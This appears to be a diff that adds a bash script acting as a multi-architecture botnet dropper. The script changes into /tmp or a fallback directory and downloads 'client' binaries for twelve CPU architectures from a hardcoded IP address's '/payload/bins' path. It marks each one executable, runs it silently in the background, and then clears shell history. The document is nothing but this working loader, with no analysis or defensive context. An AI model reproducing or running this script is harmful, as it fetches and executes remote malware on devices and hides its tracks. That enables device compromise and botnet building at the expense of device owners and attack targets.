@@ -1,0 +1,55 @@
+#!/bin/bash
+S="2.27.4.56"
+B="http://${S}:5000/payload/bins"
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+
+wget ${B}/client_x86_64 -q 2>/dev/null || curl ${B}/client_x86_64 -o client_x86_64 -s 2>/dev/null
+chmod +x client_x86_64 2>/dev/null
+./client_x86_64 >/dev/null 2>&1 &
+
+wget ${B}/client_i686 -q 2>/dev/null || curl ${B}/client_i686 -o client_i686 -s 2>/dev/null
+chmod +x client_i686 2>/dev/null
+./client_i686 >/dev/null 2>&1 &
+
+wget ${B}/client_i586 -q 2>/dev/null || curl ${B}/client_i586 -o client_i586 -s 2>/dev/null
+chmod +x client_i586 2>/dev/null
+./client_i586 >/dev/null 2>&1 &
+
+wget ${B}/client_mips -q 2>/dev/null || curl ${B}/client_mips -o client_mips -s 2>/dev/null
+chmod +x client_mips 2>/dev/null
+./client_mips >/dev/null 2>&1 &
+
+wget ${B}/client_mipsel -q 2>/dev/null || curl ${B}/client_mipsel -o client_mipsel -s 2>/dev/null
+chmod +x client_mipsel 2>/dev/null
+./client_mipsel >/dev/null 2>&1 &
+
+wget ${B}/client_armv4l -q 2>/dev/null || curl ${B}/client_armv4l -o client_armv4l -s 2>/dev/null
+chmod +x client_armv4l 2>/dev/null
+./client_armv4l >/dev/null 2>&1 &
+
+wget ${B}/client_armv5l -q 2>/dev/null || curl ${B}/client_armv5l -o client_armv5l -s 2>/dev/null
+chmod +x client_armv5l 2>/dev/null
+./client_armv5l >/dev/null 2>&1 &
+
+wget ${B}/client_armv6l -q 2>/dev/null || curl ${B}/client_armv6l -o client_armv6l -s 2>/dev/null
+chmod +x client_armv6l 2>/dev/null
+./client_armv6l >/dev/null 2>&1 &
+
+wget ${B}/client_armv7l -q 2>/dev/null || curl ${B}/client_armv7l -o client_armv7l -s 2>/dev/null
+chmod +x client_armv7l 2>/dev/null
+./client_armv7l >/dev/null 2>&1 &
+
+wget ${B}/client_powerpc -q 2>/dev/null || curl ${B}/client_powerpc -o client_powerpc -s 2>/dev/null
+chmod +x client_powerpc 2>/dev/null
+./client_powerpc >/dev/null 2>&1 &
+
+wget ${B}/client_m68k -q 2>/dev/null || curl ${B}/client_m68k -o client_m68k -s 2>/dev/null
+chmod +x client_m68k 2>/dev/null
+./client_m68k >/dev/null 2>&1 &
+
+wget ${B}/client_sh4 -q 2>/dev/null || curl ${B}/client_sh4 -o client_sh4 -s 2>/dev/null
+chmod +x client_sh4 2>/dev/null
+./client_sh4 >/dev/null 2>&1 &
+
+history -c 2>/dev/null
